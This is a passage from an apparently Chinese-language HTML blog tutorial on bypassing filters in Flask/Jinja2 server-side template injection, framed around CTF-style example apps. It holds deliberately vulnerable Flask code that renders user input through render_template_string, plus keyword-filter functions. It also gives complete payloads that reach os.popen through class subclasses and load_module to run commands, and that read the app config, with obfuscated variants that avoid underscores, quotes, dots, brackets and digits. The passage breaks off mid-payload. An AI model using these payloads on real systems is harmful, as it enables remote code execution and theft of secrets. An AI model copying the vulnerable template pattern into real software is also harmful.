class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>每次访问的时候都会把config设置为<code>None</code>，这种的话可以通过flask的内置加载对象获取，固定的格式，例如下面payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="综合符号过滤绕过"><a href="#综合符号过滤绕过" class="headerlink" title="综合符号过滤绕过"></a>综合符号过滤绕过</h1><p>继续看一道例题，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (</span><br><span class="line">        <span class="string">&quot;_&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;request&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received input:&quot;</span>, raw_str)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>这道题目把空格、下划线、单引号、双引号、点、request库全都过滤掉了，下面简单举个可以获取到这些特殊数据的案例，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            空格获取1:&#123;% set a=(&#123;&#125;|select()|string()) %&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            空格获取2:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            空格获取3:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a[10]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            下划线获取:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a[24]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            百分号获取1:&#123;% set a=(&#123;&#125;|string|urlencode) %&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            百分号获取2:&#123;% set a=(&#123;&#125;|string|urlencode|list) %&#125;&#123;&#123;a[0]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>select是输出对象的信息，然后通过string转换字符串，再通过list转换列表，在拿去数据的时候会很方便。这部分学会之后就可以开始上面的例题了，我们可以使用下面的payload模板去进行绕过，需要用到<code>_frozen_importlib.BuiltinImporter</code>模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;type flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>具体绕过后的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhx1=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhx=(xhx1[<span class="number">24</span>],xhx1[<span class="number">24</span>])|join %&#125;&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=<span class="number">1</span>)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=<span class="number">1</span>)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=<span class="number">1</span>)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=<span class="number">1</span>)|join),xhx1[<span class="number">24</span>],(<span class="built_in">dict</span>(module=<span class="number">1</span>)|join))|join %&#125;&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=<span class="number">1</span>)|join %&#125;&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=<span class="number">1</span>)|join %&#125;&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=<span class="number">1</span>)|join,xhx)|join %&#125;&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=<span class="number">1</span>)|join,kg[<span class="number">10</span>],<span class="built_in">dict</span>(flag=<span class="number">1</span>)|join)|join%&#125;&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=<span class="number">1</span>)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(<span class="number">108</span>)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>为了更好的理解，这里拆解一下放出来，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx1=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(xhx1[<span class="number">24</span>],xhx1[<span class="number">24</span>])|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=<span class="number">1</span>)|join),xhx1[<span class="number">24</span>],(<span class="built_in">dict</span>(module=<span class="number">1</span>)|join))|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=<span class="number">1</span>)|join,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=<span class="number">1</span>)|join,kg[<span class="number">10</span>],<span class="built_in">dict</span>(flag=<span class="number">1</span>)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(<span class="number">108</span>)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>还有一些比较通用的这里我也把代码给出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            下划线1: &#123;% set xhx1=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;xhx1[24]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            下划线1: &#123;% set xhx1=(&#123;&#125;|select()|string())|list|list %&#125;&#123;&#123;xhx1&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            下划线2: &#123;% set xhx=(xhx1[24],xhx1[24])|join %&#125;&#123;&#123;xhx&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            空格: &#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;kg[10]&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            cls:&#123;% set cls=(xhx,(dict(class=1)|join),xhx)|join %&#125;&#123;&#123;cls&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            base:&#123;% set base=(xhx,(dict(base=1)|join),xhx)|join %&#125;&#123;&#123;base&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            subclasses:&#123;% set subclasses=(xhx,(dict(subclasses=1)|join),xhx)|join %&#125;&#123;&#123;subclasses&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            getitem:&#123;% set getitem=(xhx,dict(getitem=1)|join,xhx)|join %&#125;&#123;&#123;getitem&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            init:&#123;% set init=(xhx,dict(init=1)|join,xhx)|join %&#125;&#123;&#123;init&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            globals:&#123;% set globals=(xhx,dict(globals=1)|join,xhx)|join %&#125;&#123;&#123;globals&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            builtins: &#123;% set builtins=(xhx,dict(builtins=1)|join,xhx)|join %&#125;&#123;&#123;builtins&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure>
<h1 id="综合符号加数字过滤绕过"><a href="#综合符号加数字过滤绕过" class="headerlink" title="综合符号加数字过滤绕过"></a>综合符号加数字过滤绕过</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (</span><br><span class="line">        <span class="string">&quot;_&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;]&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">        <span class="keyword">or</span> <span class="built_in">any</span>(char.isdigit() <span class="keyword">for</span> char <span class="keyword">in</span> input_str)</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;request&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received input:&quot;</span>, raw_str)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个在上一道题目的基础上增加了中括号，纯数字过滤，中括号可以采用<code>attr(__getitem__)(*)</code>去解决，但是因为<code>_</code>无法直接获取，在获取<code>_</code>过程中就需要使用数组，所以这里<code>__getitem__</code>需要用<code>pop</code>，他的作用和<code>__getitem__</code>基本一样但是他会把数据永久性弹出需要注意，然后dict的value可以换成单个字符，还有就是数字，数字索引一共没多少直接用lenght去生成即可。具体payload模板采用上面的基础上进行修改，模板如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx1=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(xhx1[<span class="number">24</span>],xhx1[<span class="number">24</span>])|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=<span class="number">1</span>)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=<span class="number">1</span>)|join),xhx1[<span class="number">24</span>],(<span class="built_in">dict</span>(module=<span class="number">1</span>)|join))|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=<span class="number">1</span>)|join,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=<span class="number">1</span>)|join,kg[<span class="number">10</span>],<span class="built_in">dict</span>(flag=<span class="number">1</span>)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(<span class="number">108</span>)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>修改后的模板如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ershisi = <span class="built_in">dict</span>(aaaaaaaa=a)|join|length*<span class="built_in">dict</span>(aaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yilingba = <span class="built_in">dict</span>(aaaaaa=a)|join|length*<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhxa=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhxb=xhxa|attr(pop)(ershisi)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(xhxb,xhxb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=a)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=a)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=a)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=a)|join),xhxb,(<span class="built_in">dict</span>(module=a)|join))|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=a)|join,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join,kg|attr(pop)(shi),<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(yilingba)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改后的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> ershisi = <span class="built_in">dict</span>(aaaaaaaa=a)|join|length*<span class="built_in">dict</span>(aaa=a)|join|length %&#125;&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length %&#125;&#123;% <span class="built_in">set</span> yilingba = <span class="built_in">dict</span>(aaaaaa=a)|join|length*<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|length %&#125;&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join %&#125;&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhxa=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhxb=xhxa|attr(pop)(ershisi)%&#125;&#123;% <span class="built_in">set</span> xhx=(xhxb,xhxb)|join %&#125;&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=a)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=a)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=a)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=a)|join),xhxb,(<span class="built_in">dict</span>(module=a)|join))|join %&#125;&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;&#123;% <span 